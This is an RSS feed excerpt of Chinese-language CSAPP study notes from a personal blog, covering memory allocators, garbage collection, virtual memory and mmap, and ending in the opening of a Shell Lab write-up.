&lt;li&gt;插入链表第一个节点LIFO:简单省事,但碎片化比按地址排序严重&lt;/li&gt;
&lt;li&gt;按地址排序:addr(prev) &amp;lt; addr(curr) &amp;lt; addr(next)
  需要搜索&lt;/li&gt;
&lt;/ul&gt;
&lt;h4&gt;LIFO&lt;/h4&gt;
&lt;p&gt;&lt;img src=&quot;https://tankimzeg.top/attachments/Pasted%20image%2020250207171729.png&quot; alt=&quot;&quot;&gt;&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;&lt;p&gt;Case 1
 &lt;img src=&quot;https://tankimzeg.top/attachments/Pasted%20image%2020250207233408.png&quot; alt=&quot;&quot;&gt;&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;&lt;p&gt;Case 2
 &lt;img src=&quot;https://tankimzeg.top/attachments/Pasted%20image%2020250207233454.png&quot; alt=&quot;&quot;&gt;&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;&lt;p&gt;Case 3
 &lt;img src=&quot;https://tankimzeg.top/attachments/Pasted%20image%2020250207233645.png&quot; alt=&quot;&quot;&gt;&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;&lt;p&gt;Case 4
 &lt;img src=&quot;https://tankimzeg.top/attachments/Pasted%20image%2020250207233712.png&quot; alt=&quot;&quot;&gt;&lt;/p&gt;
&lt;/li&gt;
&lt;/ol&gt;
&lt;h3&gt;总结&lt;/h3&gt;
&lt;p&gt;现在,分配时间是空闲块数量呈线性相关关系而不是堆的大小.
合并 操作比较复杂,也需要额外的开销.
不足以高效的通用于现实分配器.
维护多种大小的空闲列表,每个列表都是一个显式列表.&lt;/p&gt;
&lt;h2&gt;隔离空闲块列表&lt;/h2&gt;
&lt;p&gt;每类尺寸的块大小都有自己的空闲列表
&lt;img src=&quot;https://tankimzeg.top/attachments/Pasted%20image%2020250208000254.png&quot; alt=&quot;&quot;&gt;&lt;/p&gt;
&lt;h3&gt;分配大小为n的块&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;搜寻合适大小的块列表m&amp;gt;n&lt;/li&gt;
&lt;li&gt;如果找到合适的块,分割并放置碎片到合适的列表里(可选)&lt;/li&gt;
&lt;li&gt;如果找不到,尝试更大块类&lt;/li&gt;
&lt;li&gt;如果最后找不到,向操作系统请求增加堆(调用&lt;code&gt;sbrk()&lt;/code&gt;)&lt;/li&gt;
&lt;/ul&gt;
&lt;h3&gt;释放块:&lt;/h3&gt;
&lt;p&gt;合并,放到合适的列表中&lt;/p&gt;
&lt;h3&gt;优点&lt;/h3&gt;
&lt;p&gt;高吞吐量,高内存利用率&lt;/p&gt;
&lt;h1&gt;垃圾回收机制&lt;/h1&gt;
&lt;p&gt;自动回收堆分配的空间,应用不用调用&lt;code&gt;free&lt;/code&gt;函数.
内存管理器如何知道内存何时可以被释放?
将内存视为有向图
不在堆中但包含指向堆的指针叫做根节点(寄存器/栈/全局变量).
指针是图的边,块是图的节点.
&lt;img src=&quot;https://tankimzeg.top/attachments/Pasted%20image%2020250208002600.png&quot; alt=&quot;&quot;&gt;
如果存在从根节点到节点的路径,该节点就是可达的.
不可达的节点是垃圾.&lt;/p&gt;
&lt;h2&gt;标记清扫收集(Mark and Sweep Collection)&lt;/h2&gt;
&lt;p&gt;当空间耗尽后:
在每个块的头部设置额外的标记位:从根节点开始,标记每一个可达块.再次扫描所有块,将不可达的块释放.
&lt;img src=&quot;https://tankimzeg.top/attachments/Pasted%20image%2020250208003722.png&quot; alt=&quot;&quot;&gt;&lt;/p&gt;
&lt;h1&gt;内存相关的危险&lt;/h1&gt;
&lt;p&gt;把变量当成指针,读取未初始化数据,覆写内存,悬空指针多次释放指针内存泄漏&lt;/p&gt;
&lt;h2&gt;处理内存Bug&lt;/h2&gt;
&lt;ul&gt;
&lt;li&gt;调试器:GDB&lt;/li&gt;
&lt;li&gt;数据结构一致性检查器
  静默运行,出错时打印错误&lt;/li&gt;
&lt;li&gt;valgrid:二分检查&lt;/li&gt;
&lt;li&gt;&lt;code&gt;setenv MALLOC_CHECK_ 3&lt;/code&gt;&lt;/li&gt;
&lt;/ul&gt;
</content:encoded><dc:creator>TanKimzeg</dc:creator><pubDate>Thu, 06 Feb 2025 16:00:00 GMT</pubDate></item><item><title>虚拟内存(系统)</title><link>https://tankimzeg.top/blog/csapp/virtual-memory-ii/</link><guid isPermaLink="true">https://tankimzeg.top/blog/csapp/virtual-memory-ii/</guid><content:encoded>&lt;blockquote&gt;This rendering was automatically generated by Frosti Feed and may have formatting issues. For the best experience, please visit: &lt;a href=&quot;https://tankimzeg.top/blog/csapp/virtual-memory-ii/&quot;&gt;https://tankimzeg.top/blog/csapp/virtual-memory-ii/&lt;/a&gt;&lt;/blockquote&gt; &lt;h1&gt;Intel x86-64 i7/Linux内存系统&lt;/h1&gt;
&lt;p&gt;i7处理器架构:
&lt;img src=&quot;https://tankimzeg.top/attachments/Pasted%20image%2020250206172220.png&quot; alt=&quot;&quot;&gt;&lt;/p&gt;
&lt;h2&gt;符号:&lt;/h2&gt;
&lt;ul&gt;
&lt;li&gt;基本量&lt;ul&gt;
&lt;li&gt;$N=2^m$:虚拟地址空间&lt;/li&gt;
&lt;li&gt;$M=2^m$:物理地址空间&lt;/li&gt;
&lt;li&gt;$P=2^p$:页大小(字节)&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;虚拟地址(VA)组成&lt;ul&gt;
&lt;li&gt;TLBI:TLB索引&lt;/li&gt;
&lt;li&gt;TLBT:TLB tag&lt;/li&gt;
&lt;li&gt;VPO:虚拟页偏移量&lt;/li&gt;
&lt;li&gt;VPN:虚拟页码&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;物理地址(PA)组成&lt;ul&gt;
&lt;li&gt;PPO:物理地址偏移量(等于VPO)&lt;/li&gt;
&lt;li&gt;PPN:物理页码&lt;/li&gt;
&lt;li&gt;CO:缓存行中的偏移量&lt;/li&gt;
&lt;li&gt;CI:缓存索引&lt;/li&gt;
&lt;li&gt;CT:缓存tag&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h2&gt;地址翻译&lt;/h2&gt;
&lt;p&gt;下图把整个地址翻译过程描述得非常清晰:
&lt;img src=&quot;https://tankimzeg.top/attachments/Pasted%20image%2020250206173424.png&quot; alt=&quot;&quot;&gt;&lt;/p&gt;
&lt;h2&gt;第1~3级PTE&lt;/h2&gt;
&lt;p&gt;&lt;img src=&quot;https://tankimzeg.top/attachments/Pasted%20image%2020250206174113.png&quot; alt=&quot;&quot;&gt;&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;P: Child page table present in physical memory (1) or not (0).&lt;/li&gt;
&lt;li&gt;R/W: Read-only or read-write access access permission for all reachable pages.&lt;/li&gt;
&lt;li&gt;U/S: user or supervisor (kernel) mode access permission for all reachable pages.&lt;/li&gt;
&lt;li&gt;WT: Write-through or write-back cache policy for the child page table&lt;/li&gt;
&lt;li&gt;A: Reference bit (set by MMU on reads and writes, cleared by socware).&lt;/li&gt;
&lt;li&gt;PS: Page size either 4 KB or 4 MB (defined for Level 1 PTEs only).&lt;/li&gt;
&lt;li&gt;Page table physical base address: 40 most significant bits of physical page table address (forces page tables to be 4KB aligned)&lt;/li&gt;
&lt;li&gt;XD: Disable or enable instruc;on fetches from all pages reachable from this PTE.&lt;/li&gt;
&lt;/ul&gt;
&lt;h2&gt;第4级PTE&lt;/h2&gt;
&lt;p&gt;&lt;img src=&quot;https://tankimzeg.top/attachments/Pasted%20image%2020250206175028.png&quot; alt=&quot;&quot;&gt;
不再是下一级的页表基址,而是页的物理地址.
第6位和第7位有变化:&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;D: Dirty bit (set by MMU on writes, cleared by socware)&lt;/li&gt;
&lt;/ul&gt;
&lt;h2&gt;页表翻译&lt;/h2&gt;
&lt;p&gt;&lt;img src=&quot;https://tankimzeg.top/attachments/Pasted%20image%2020250206175410.png&quot; alt=&quot;&quot;&gt;
已经多次呈现.&lt;/p&gt;
&lt;h2&gt;加速L1内存访问&lt;/h2&gt;
&lt;p&gt;&lt;img src=&quot;https://tankimzeg.top/attachments/Pasted%20image%2020250206182631.png&quot; alt=&quot;&quot;&gt;
由于VPO和PPO是一样的,在进行地址翻译的同时,把VPO发送给L1缓存,就可以先对tag位进行筛选,筛选的结果与地址翻译的结果结合,从而加速了缓存查找.&lt;/p&gt;
&lt;h2&gt;Linux进程的虚拟地址空间&lt;/h2&gt;
&lt;p&gt;&lt;img src=&quot;https://tankimzeg.top/attachments/Pasted%20image%2020250206183123.png&quot; alt=&quot;&quot;&gt;&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;[!think]
为什么要有kernel virtual memory?这块不是很懂.&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;Linux系统将虚拟内存组织成一块一块的区域:
&lt;img src=&quot;https://tankimzeg.top/attachments/Pasted%20image%2020250206184609.png&quot; alt=&quot;&quot;&gt;&lt;/p&gt;
&lt;p&gt;三种异常:
&lt;img src=&quot;https://tankimzeg.top/attachments/Pasted%20image%2020250206184855.png&quot; alt=&quot;&quot;&gt;&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;Segmentation fault:访问不存在的页,不在vm_start和vm_end区间内.&lt;/li&gt;
&lt;li&gt;Prtection exception:违反了权限(Linux报Segmentation fault).&lt;/li&gt;
&lt;li&gt;正常的页错误.&lt;/li&gt;
&lt;/ol&gt;
&lt;h1&gt;内存映射&lt;/h1&gt;
&lt;p&gt;虚拟内存的区域初始化的时候,和磁盘上的对象关联起来,这个过程叫做内存映射.
初始化的内容来自那个文件,将其复制到内存.文件可以是:&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;磁盘上的常规文件.如可执行文件.
  初始化的页的数据就是其中的section&lt;/li&gt;
&lt;li&gt;匿名文件,包含的全是0
  第一次引用这个页时(first fault),创建一个全为0的页(demand-zero page).
  一旦这个页被写入后,就和其他页一样.
  写入的页被复制到内核维护的专门的交换文件(swap file).&lt;/li&gt;
&lt;/ul&gt;
&lt;h2&gt;共享对象(Share Object)&lt;/h2&gt;
&lt;p&gt;利用内存映射可以实现进程间共享对象,因为进程可以映射虚拟内存的区域到同一个对象.
&lt;img src=&quot;https://tankimzeg.top/attachments/Pasted%20image%2020250207100746.png&quot; alt=&quot;&quot;&gt;
因为这个共享对象有一个唯一的名字,所以内核可以检查有没有其他进程映射到那个对象.如果有,那么内核就把虚拟地址倒影的区域映射到相同的物理地址.&lt;/p&gt;
&lt;h2&gt;私有写时复制对象(Private Copy-on-write Object)&lt;/h2&gt;
&lt;p&gt;这个区域的页表标记为私有写时复制.PTE的私有区域被标记为只读.向私有页写的指令会触发protection fault.异常处理将创建一个新的R/W页,然后在这个新的页上写.
&lt;img src=&quot;https://tankimzeg.top/attachments/Pasted%20image%2020250207102141.png&quot; alt=&quot;&quot;&gt;&lt;/p&gt;
&lt;h2&gt;&lt;code&gt;fork&lt;/code&gt;函数&lt;/h2&gt;
&lt;p&gt;以上私有COW技术提供了高效的&lt;code&gt;fork&lt;/code&gt;思路.
进行&lt;code&gt;fork&lt;/code&gt;时,内核只复制所有的内核数据结构:&lt;code&gt;mm_struct&lt;/code&gt;, &lt;code&gt;vm_arear_struct&lt;/code&gt;以及页表.
然后内核把两个进程中的每个页都标记为只读,把每一个&lt;code&gt;vm_area_struct&lt;/code&gt;标记为私有写时复制(COW).
当&lt;code&gt;fork&lt;/code&gt;函数返回时,每个进程都有相同的地址空间.两个进程读的时候,它们会共享这些区域;当进程要写时,会根据写时复制机制,创建一个新页.&lt;/p&gt;
&lt;h2&gt;&lt;code&gt;execve&lt;/code&gt;函数&lt;/h2&gt;
&lt;p&gt;删除当前进程的所有&lt;code&gt;vm_arear_struct&lt;/code&gt;和页表.为新区域创建新的&lt;code&gt;vm_area_struct&lt;/code&gt;和页表.然后初始化.
&lt;img src=&quot;https://tankimzeg.top/attachments/Pasted%20image%2020250207112009.png&quot; alt=&quot;&quot;&gt;
最后把程序计数器%rip设置为代码区域的入口.
一切仅仅是做了映射,修改内核中的数据结构.直到访问时遇到页错误才加载到内存中.&lt;/p&gt;
&lt;h2&gt;用户级内存映射&lt;/h2&gt;
&lt;pre&gt;&lt;code class=&quot;language-c&quot;&gt;void *mmap(void *start, int len, int prot, int flags, int fd, int offset);
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;&lt;img src=&quot;https://tankimzeg.top/attachments/Pasted%20image%2020250207112924.png&quot; alt=&quot;&quot;&gt;
将虚拟地址start映射到文件描述符fd偏移量offset起len字节的数据.
prot指定保护类型:PROT_READ,PROT_WRITE...
flag指定文件对象类型:MAP_ANON(匿名文件),MAP_PRIVATE,MAP_SHARED...
返回指向映射区域的指针(如果start被占用,有操作系统选择)&lt;/p&gt;
&lt;h3&gt;用例:复制文件无需&lt;code&gt;read&lt;/code&gt;&lt;/h3&gt;
&lt;pre&gt;&lt;code class=&quot;language-c&quot;&gt;void mmapcopy(int fd, int size){
	/* Ptr to memory mapped area */
	char *buf;
	if(!(buf = mmap(NULL, size, PRO_READ, MAP_PRIVATE, fd,0)))
		unix_error(&amp;quot;mmap error&amp;quot;);
	if(write(1, buf, size)&amp;lt;0)    /* stdout: 1 */
		unix_erro(&amp;quot;write error&amp;quot;);
	return;
}

int amin(int argc, char **argv){
	struct stat stat; 
	int fd; 
	
	/* Check for required cmd line arg */ 
	if (argc != 2) { printf(&amp;quot;usage: %s \n&amp;quot;, argv[0]); exit(0); } 
	
	/* Copy input file to stdout */ 
	if((fd = open(argv[1], O_RDONLY, 0)) &amp;lt; 0) unix_error(&amp;quot;open error&amp;quot;);
	if(fstat(fd, &amp;amp;stat) &amp;lt; 0) unix_error(&amp;quot;fstart error&amp;quot;); 
	mmapcopy(fd, stat.st_size); 
	exit(0);
}
&lt;/code&gt;&lt;/pre&gt;
</content:encoded><dc:creator>TanKimzeg</dc:creator><pubDate>Wed, 05 Feb 2025 16:00:00 GMT</pubDate></item><item><title>虚拟内存(概念)</title><link>https://tankimzeg.top/blog/csapp/virtual-memory-i/</link><guid isPermaLink="true">https://tankimzeg.top/blog/csapp/virtual-memory-i/</guid><content:encoded>&lt;blockquote&gt;This rendering was automatically generated by Frosti Feed and may have formatting issues. For the best experience, please visit: &lt;a href=&quot;https://tankimzeg.top/blog/csapp/virtual-memory-i/&quot;&gt;https://tankimzeg.top/blog/csapp/virtual-memory-i/&lt;/a&gt;&lt;/blockquote&gt; &lt;p&gt;获取内存的方式:物理地址和虚拟地址&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;物理地址:最简单的方式,用于简单的电子系统
  &lt;img src=&quot;https://tankimzeg.top/attachments/Pasted%20image%2020250205162744.png&quot; alt=&quot;&quot;&gt;&lt;/li&gt;
&lt;li&gt;虚拟地址:用于所有的现代智能设备
  &lt;img src=&quot;https://tankimzeg.top/attachments/Pasted%20image%2020250205162827.png&quot; alt=&quot;&quot;&gt;
  以[[存储器层次结构#磁盘|CPU访问磁盘]]为例:磁盘控制器将磁盘抽象成一系列逻辑块提供给内核,并将内核发送的逻辑块号转换为实际的物理地址&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;地址空间:&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;线性地址空间:顺序非负整数 {0, 1, 2, 3, ...}&lt;/li&gt;
&lt;li&gt;虚拟地址空间:$N=2^n$个虚拟地址{0, 1, 2, 3, ..., N-1}&lt;/li&gt;
&lt;li&gt;物理地址空间:$M=2^m$个物理地址{0, 1, 2, 3, ..., M-1}
虚拟地址空间比物理地址空间大.&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;为什么使用虚拟内存(VM:Virtual Memory)?&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;作为缓存高效使用内存&lt;ul&gt;
&lt;li&gt;虚拟内存是存储在磁盘上的数据的DRAM缓存&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;简化内存管理&lt;ul&gt;
&lt;li&gt;每个进程具有相同格式的线性虚拟地址空间:代码和数据总是加载到固定的地址,但实际上那些地址对应的内容分布在整个内存里.&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;独立的地址空间&lt;ul&gt;
&lt;li&gt;一个进程不能使用另一个进程的内存&lt;/li&gt;
&lt;li&gt;用户进程不能访问内核特权信息和代码&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h1&gt;缓存的工具&lt;/h1&gt;
&lt;p&gt;从概念上讲,虚拟内存是存储在磁盘上的字节序列,存储在磁盘上的虚拟内存的内容缓存在DRAM中.每个缓存的块称为&lt;strong&gt;页&lt;/strong&gt;($P=2^p$字节).
&lt;img src=&quot;https://tankimzeg.top/attachments/Pasted%20image%2020250205164255.png&quot; alt=&quot;&quot;&gt;
有一种映射告诉我们哪些页面已被缓存.&lt;/p&gt;
&lt;h2&gt;DRAM缓存组织&lt;/h2&gt;
&lt;p&gt;DRAM比SRAM慢10倍;磁盘比DRAM慢10000倍.
所以:&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;虚拟内存有很大的页面:4KB/4MB&lt;/li&gt;
&lt;li&gt;[[高速缓存#全相联高速缓存|全相联]]&lt;ul&gt;
&lt;li&gt;任何VP能放在任何PP&lt;/li&gt;
&lt;li&gt;需要复杂的映射函数(页表)&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;复杂的替换算法&lt;/li&gt;
&lt;li&gt;不会采取write-through而是write-back&lt;/li&gt;
&lt;/ul&gt;
&lt;blockquote&gt;
&lt;p&gt;在我的Windows笔记本电脑上,&amp;quot;Win+R&amp;quot;输入&amp;quot;msinfo32&amp;quot;查看系统信息:
&lt;img src=&quot;https://tankimzeg.top/attachments/Pasted%20image%2020250207151653.png&quot; alt=&quot;&quot;&gt;
有页的信息&lt;/p&gt;
&lt;/blockquote&gt;
&lt;h2&gt;页表(Page Table)&lt;/h2&gt;
&lt;p&gt;页表是内存中的一个数组数据结构,将虚拟页(VP)匹配到物理页(PP).每个进程都有自己的页表.&lt;/p&gt;
&lt;h3&gt;页命中(Page Hit)&lt;/h3&gt;
&lt;p&gt;要访问的数据在物理内存中(DRAM 缓存命中)
&lt;img src=&quot;https://tankimzeg.top/attachments/Pasted%20image%2020250206105354.png&quot; alt=&quot;&quot;&gt;
上图中,CPU发来一个虚拟内存地址2,MMU去查找页表中第2条,得到其物理地址,内存返回物理地址的数据.&lt;/p&gt;
&lt;h3&gt;页错误(Page Fault)&lt;/h3&gt;
&lt;p&gt;要访问的数据不在物理内存中(DRAM缓存不命中),触发[[异常控制流(异常和进程)#页错误|页错误]].
&lt;img src=&quot;https://tankimzeg.top/attachments/Pasted%20image%2020250206110324.png&quot; alt=&quot;&quot;&gt;
上图中,CPU发来的虚拟内存地址3触发页错误异常.内核处理页错误的代码决定替换的页面VP4,然后从磁盘中取出该页面VP3,加载到内存中,更新此页表条目.缺页处理程序返回到原来产生错误的指令处重新执行.&lt;/p&gt;
&lt;h3&gt;分配新页面&lt;/h3&gt;
&lt;p&gt;使用 &lt;code&gt;malloc&lt;/code&gt;分配了一大块虚拟地址空间,如果其中一个页面未分配,那么内核通过 &lt;code&gt;sbrk&lt;/code&gt;系统调用来分配该内存.&lt;code&gt;sbrk&lt;/code&gt;函数的功能是在磁盘中分配一个新的页面,修改此页表条目.
&lt;img src=&quot;https://tankimzeg.top/attachments/Pasted%20image%2020250206111906.png&quot; alt=&quot;&quot;&gt;
上图中为VP5分配了一个新页面.&lt;/p&gt;
&lt;h2&gt;局部性的体现&lt;/h2&gt;
&lt;p&gt;在任何时间点,程序倾向于使用的活跃虚拟页称为&lt;strong&gt;工作集(working set)&lt;/strong&gt;.
程序的局部性越好,工作集越小.
如果工作集 &amp;lt; 主存,必命中.
如果SUM(工作集)&amp;gt;主存,页面来回替换&lt;/p&gt;
&lt;h1&gt;内存管理的工具&lt;/h1&gt;
&lt;p&gt;每个进程拥有自己的虚拟地址空间,内核通过给每个进程提供独立的页表来实现这一点.
在虚拟内存中的页面可以映射到DRAM物理地址空间的任何位置.可能存在着多对一的关系.&lt;/p&gt;
&lt;p&gt;import Info from &amp;quot;@/components/mdx/Info.astro&amp;quot;;&lt;/p&gt;
&lt;Info&gt;
虚拟内存是物理内存的一种抽象**视图**,我想起了在数据库中,数据表可以为不同的用户提供视图,根据他们的需求和权限,也达到了再组织的功能.我认为虚拟内存在这一点上是跟数据库的视图是相似的,物理内存对应于数据库的表格,不是非常整齐;虚拟内存对应视图,无需将表格数据重新复制一份而是从表格中取出;不同的进程对应不同用户,拥有不同需求和权限.
&lt;/Info&gt;

&lt;p&gt;&lt;img src=&quot;https://tankimzeg.top/attachments/Pasted%20image%2020250206114145.png&quot; alt=&quot;&quot;&gt;
如果设想没有这一个抽象层,程序在链接时是不知道程序加载时数据会放在哪里,寻址无从谈起.如果内存为每个程序都提前分配一个固定内存空间的话,在程序加载前无法得知程序的大小,会造成空间的浪费.虚拟内存就是解决了这个问题.程序加载时才创建页表,将相对地址映射到内存的物理地址.
不同的页可以映射相同的内存地址,也实现了[[链接#动态链接库/共享库(.so文件)|共享库]]的功能!&lt;/p&gt;
&lt;h2&gt;简化链接和加载过程&lt;/h2&gt;
&lt;ul&gt;
&lt;li&gt;链接
  通过虚拟内存这一层,现在,链接器可以假设每个程序加载到相同的位置,所以链接器可以[[链接#连接器的行为|重定向]]&lt;/li&gt;
&lt;li&gt;加载
  &lt;code&gt;execve&lt;/code&gt; 为[[链接#可执行可链接格式(ELF)|.text和.data section]]分配虚拟页,并创建页表,每一个元素都标记为无效(uncached,需要时再去复制到内存里,这样就节省了启动时间和内存空间).&lt;/li&gt;
&lt;/ul&gt;
&lt;h1&gt;内存保护的工具&lt;/h1&gt;
&lt;p&gt;在PTE的地址前拓展权限位,MMU在每一次访问前检查这些权限位,确保操作合法.
&lt;img src=&quot;https://tankimzeg.top/attachments/Pasted%20image%2020250206151332.png&quot; alt=&quot;&quot;&gt;&lt;/p&gt;
&lt;h1&gt;地址翻译&lt;/h1&gt;
&lt;p&gt;页表实现地址翻译
&lt;img src=&quot;https://tankimzeg.top/attachments/Pasted%20image%2020250206152945.png&quot; alt=&quot;&quot;&gt;
回想缓存的知识,由于这是&lt;strong&gt;全相联缓存&lt;/strong&gt;,所以无需set位,只有tag位和offset位.&lt;/p&gt;
&lt;h2&gt;页命中&lt;/h2&gt;
&lt;p&gt;&lt;img src=&quot;https://tankimzeg.top/attachments/Pasted%20image%2020250206153156.png&quot; alt=&quot;&quot;&gt;&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;处理器发送虚拟地址给MMU&lt;/li&gt;
&lt;li&gt;MMU发送PTE地址给页表&lt;/li&gt;
&lt;li&gt;MMU接到PTE&lt;/li&gt;
&lt;li&gt;MMU发送物理地址给缓存/内存&lt;/li&gt;
&lt;li&gt;缓存/内存发送数据给处理器&lt;/li&gt;
&lt;/ol&gt;
&lt;h2&gt;页错误&lt;/h2&gt;
&lt;p&gt;&lt;img src=&quot;https://tankimzeg.top/attachments/Pasted%20image%2020250206153517.png&quot; alt=&quot;&quot;&gt;&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;处理器发送虚拟地址给MMU&lt;/li&gt;
&lt;li&gt;MMU发送PTE地址给页表&lt;/li&gt;
&lt;li&gt;MMU接到PTE&lt;/li&gt;
&lt;li&gt;无效,触发页错误异常&lt;/li&gt;
&lt;li&gt;替换,写回磁盘&lt;/li&gt;
&lt;li&gt;读取需要的页,更新PTE&lt;/li&gt;
&lt;li&gt;返回原指令,重新执行&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;从内存中获取的内容都要经过[[存储器层次结构|缓存层次结构]],所以实际上的过程是这样的(只列出L1缓存):
&lt;img src=&quot;https://tankimzeg.top/attachments/Pasted%20image%2020250206154000.png&quot; alt=&quot;&quot;&gt;&lt;/p&gt;
&lt;h2&gt;转换后备缓冲区(TLB:Translation Lookaside Buffer)&lt;/h2&gt;
&lt;p&gt;页表的条目缓存在MMU内的一个硬件缓存TLB中.&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;是[[高速缓存#组相联高速缓存|组相联高速缓存]]&lt;/li&gt;
&lt;li&gt;映射:虚拟页码-&amp;gt;物理地址&lt;blockquote&gt;
&lt;p&gt;&lt;em&gt;跟套娃一样hhh&lt;/em&gt;&lt;/p&gt;
&lt;/blockquote&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;&lt;img src=&quot;https://tankimzeg.top/attachments/Pasted%20image%2020250206155714.png&quot; alt=&quot;&quot;&gt;&lt;/p&gt;
&lt;h3&gt;TLB命中&lt;/h3&gt;
&lt;p&gt;&lt;img src=&quot;https://tankimzeg.top/attachments/Pasted%20image%2020250206155933.png&quot; alt=&quot;&quot;&gt;&lt;/p&gt;
&lt;h3&gt;TLB不命中&lt;/h3&gt;
&lt;p&gt;&lt;img src=&quot;https://tankimzeg.top/attachments/Pasted%20image%2020250206160047.png&quot; alt=&quot;&quot;&gt;
TLB miss发生的频率很低&lt;/p&gt;
&lt;h2&gt;多级页表&lt;/h2&gt;
&lt;blockquote&gt;
&lt;p&gt;&lt;em&gt;还在套娃XD&lt;/em&gt;&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;上面的页表结构中,每一个VP对应有一个页表的条目.如果一个程序有很多VP未分配,页表就有很多项是无效的,这会造成页表空间的浪费.使用多级页表来解决这问题.
&lt;img src=&quot;https://tankimzeg.top/attachments/Pasted%20image%2020250206162001.png&quot; alt=&quot;&quot;&gt;
上图的虚拟内存中,VP0&lt;del&gt;VP1023,VP1024&lt;/del&gt;VP2047这2K页有内容,分别用两个二级页表来存储.从VP2048开始有6K未分配页面,不设二级页表.最后1024页,前1023个未分配,最后一页是栈,设二级页表,该二级页表的最后一个指针指向VP9215,其他指针是空指针.
&lt;img src=&quot;https://tankimzeg.top/attachments/Pasted%20image%2020250206162713.png&quot; alt=&quot;&quot;&gt;
对于k级页表,将VPN划分成k段,像一棵树一样一次逐级查找,最后取得物理地址.
一般是4级页表.根据局部性,页表缓存在TLB中,倒也不会增加太多开销,反而能缩小页表的大小.&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;啊啊啊好绕要绕晕了...&lt;/p&gt;
&lt;/blockquote&gt;
</content:encoded><dc:creator>TanKimzeg</dc:creator><pubDate>Tue, 04 Feb 2025 16:00:00 GMT</pubDate></item><item><title>Shlab</title><link>https://tankimzeg.top/blog/csapp/shlab/</link><guid isPermaLink="true">https://tankimzeg.top/blog/csapp/shlab/</guid><description>Shell lab records</description><content:encoded>&lt;blockquote&gt;This rendering was automatically generated by Frosti Feed and may have formatting issues. For the best experience, please visit: &lt;a href=&quot;https://tankimzeg.top/blog/csapp/shlab/&quot;&gt;https://tankimzeg.top/blog/csapp/shlab/&lt;/a&gt;&lt;/blockquote&gt; &lt;p&gt;import Collapse from &amp;quot;../../components/mdx/Collapse.astro&amp;quot;;&lt;/p&gt;
&lt;h1&gt;着手&lt;/h1&gt;
&lt;p&gt;Writeup告诉我,本实验可以两个人组队完成,而我当然只能自己完成咯^_^&lt;/p&gt;
&lt;p&gt;本实验提供了一个shell框架(包括数据结构&lt;code&gt;job_t&lt;/code&gt;),要让我自己编写几个关键函数:&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;code&gt;eval&lt;/code&gt;:执行命令行&lt;/li&gt;
&lt;li&gt;&lt;code&gt;builtin_cmd&lt;/code&gt;:遇到内置函数(&lt;code&gt;quit&lt;/code&gt;,&lt;code&gt;fg&lt;/code&gt;,&lt;code&gt;bg&lt;/code&gt;,&lt;code&gt;quit&lt;/code&gt;)直接执行&lt;/li&gt;
&lt;li&gt;&lt;code&gt;do_bgfg&lt;/code&gt;: 实施后台进程调度&lt;/li&gt;
&lt;li&gt;&lt;code&gt;waitfg&lt;/code&gt;: 阻塞等待前台任务完成.&lt;/li&gt;
&lt;li&gt;&lt;code&gt;sigchld_handler&lt;/code&gt;:捕获SIGCHILD信号&lt;/li&gt;
&lt;li&gt;&lt;code&gt;sigint_handler&lt;/code&gt;: 捕获SIGINT(Ctrl-C)信号&lt;/li&gt;
&lt;li&gt;&lt;code&gt;sigstp_handler&lt;/code&gt;: 捕获SIGTSP(Ctrl-Z)信号
实现由前台后台调度的tiny shell.&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;我没有着急开始写,而是先浏览了tsh.c的所有代码,熟悉了数据结构和help函数,惊叹于分割处理命令行参数的&lt;code&gt;pearseline()&lt;/code&gt;函数,然后自顶向下开始思考(实际上是还没思路hhh),参考了别人的代码量[^1],想清楚了每个函数负责什么功能再动手.&lt;/p&gt;
&lt;p&gt;[^1]:&lt;a href=&quot;https://blog.csdn.net/qq_37500516/article/details/120836083&quot;&gt;CSAPP Lab5实验记录 ---- Shell Lab（实验分析 + 完整代码）&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;测试方法:&lt;/p&gt;
&lt;pre&gt;&lt;code class=&quot;language-shell&quot;&gt;make
make test*
make rtest*
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;将我的tsh与参考答案tshref对比,要求输出一致(处理PID).&lt;/p&gt;
&lt;h1&gt;程序设计&lt;/h1&gt;
